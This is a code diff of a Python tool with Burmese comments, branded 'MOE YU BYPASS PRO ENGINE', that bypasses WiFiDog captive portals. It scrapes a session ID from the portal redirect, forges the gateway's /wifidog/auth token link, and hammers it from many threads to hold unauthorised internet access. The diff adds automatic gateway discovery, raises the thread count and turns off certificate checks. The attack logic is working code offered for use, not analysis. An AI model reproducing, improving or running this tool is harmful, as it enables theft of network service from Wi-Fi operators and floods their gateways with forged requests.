@@ -23,7 +23,7 @@ from rich.text import Text
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 console = Console()
 
-PING_THREADS = 8
+PING_THREADS = 15 # Thread အနည်းငယ် တိုးထားပေးပါတယ်
 MIN_INTERVAL = 0.05
 MAX_INTERVAL = 0.2
 
@@ -72,6 +72,17 @@ def get_hwid():
         return new_id
     except: return "MOE-DEFAULT-999"
 
+def get_current_gateway():
+    """လက်ရှိချိတ်ထားတဲ့ Network ရဲ့ Gateway IP (Router IP) ကို ရှာပေးသည်"""
+    try:
+        # Termux/Android command သုံးပြီး default gateway ရှာခြင်း
+        gateway = subprocess.check_output("ip route show | grep default | awk '{print $3}'", shell=True).decode().strip()
+        if gateway:
+            return gateway
+        return "192.168.61.1" # ရှာမတွေ့ရင် default ထားမယ်
+    except:
+        return "192.168.61.1"
+
 def check_expiry(expiry_str):
     if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
     try:
@@ -83,7 +94,7 @@ def check_expiry(expiry_str):
 def display_hacker_flag():
     console.print(Align.center(BABY_LOGO))
     console.print(Align.center(BANNER))
-    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.2[/bold cyan]\n"))
+    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v7.8[/bold cyan]\n"))
 
 def simpler_hacker_typing(text, style="bold green"):
     console.print("[bold #00FF00]>>> [/bold #00FF00]", end="")
@@ -136,17 +147,24 @@ def start_bypass_process():
     while not stop_event.is_set():
         try:
             session = requests.Session()
+            # Redirect စစ်ဖို့ ပထမဆုံး လှမ်းခေါ်ခြင်း
             r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
+            
             if r.status_code == 204:
+                # အင်တာနက် ရနေရင် ၅ စက္ကန့် စောင့်မယ်
                 time.sleep(5)
                 continue
             
             portal_url = r.url
             r1 = session.get(portal_url, timeout=10, verify=False)
+            
+            # JavaScript location.href ကို ရှာခြင်း
             path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
             next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
             
             r2 = session.get(next_url, timeout=10, verify=False)
+            
+            # Session ID ဆွဲထုတ်ခြင်း
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             if not sid:
                 sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
@@ -154,15 +172,20 @@ def start_bypass_process():
             
             if sid:
                 p = parse_qs(urlparse(portal_url).query)
-                auth_link = f"http://{p.get('gw_address',['192.168.60.1'])[0]}:{p.get('gw_port',['2060'])[0]}/wifidog/auth?token={sid}"
+                # Dynamic Gateway ယူပြီး Auth Link ဆောက်ခြင်း
+                current_gw = p.get('gw_address', [get_current_gateway()])[0]
+                gw_port = p.get('gw_port', ['2060'])[0]
                 
-                # စာတန်းတွေ ပြန်ပြပေးမည့် function
+                auth_link = f"http://{current_gw}:{gw_port}/wifidog/auth?token={sid}"
+                
                 def pulse_ping():
                     while not stop_event.is_set():
                         try:
-                            session.get(auth_link, timeout=5)
-                            # ပုံထဲကလို စာတန်းလေး ပြန်ထည့်ထားသည်
-                            sys.stdout.write(f"{GREEN}[✓] SID {sid[:20]}... | Turbo Pulse Active{RESET}\n")
+                            res = session.get(auth_link, timeout=5)
+                            if res.status_code == 200:
+                                sys.stdout.write(f"{GREEN}[✓] SID: {sid[:15]}.. | GW: {current_gw} | Status: ACTIVE{RESET}\n")
+                            else:
+                                sys.stdout.write(f"{YELLOW}[!] PINGING GATEWAY: {current_gw} ...{RESET}\n")
                             sys.stdout.flush()
                         except: pass
                         time.sleep(0.1)
@@ -170,17 +193,22 @@ def start_bypass_process():
                 for _ in range(PING_THREADS):
                     threading.Thread(target=pulse_ping, daemon=True).start()
                 
+                # အင်တာနက် အခြေအနေကို စစ်ဆေးခြင်း
                 while True:
                     try:
                         if session.get("http://www.google.com", timeout=3).status_code == 200:
                             time.sleep(10)
                         else: break
                     except: break
-        except:
+            else:
+                sys.stdout.write(f"{RED}[-] FAILED TO CAPTURE SID. RETRYING...{RESET}\n")
+        except Exception as e:
             time.sleep(5)
 
 if __name__ == "__main__":
     if check_license_hacker_style():
-        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
+        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), 
+                            subtitle="[bold yellow]Target: Dynamic Gateway Enabled[/bold yellow]",
+                            border_style="bold red", expand=False))
         try: start_bypass_process()
         except KeyboardInterrupt: sys.exit()
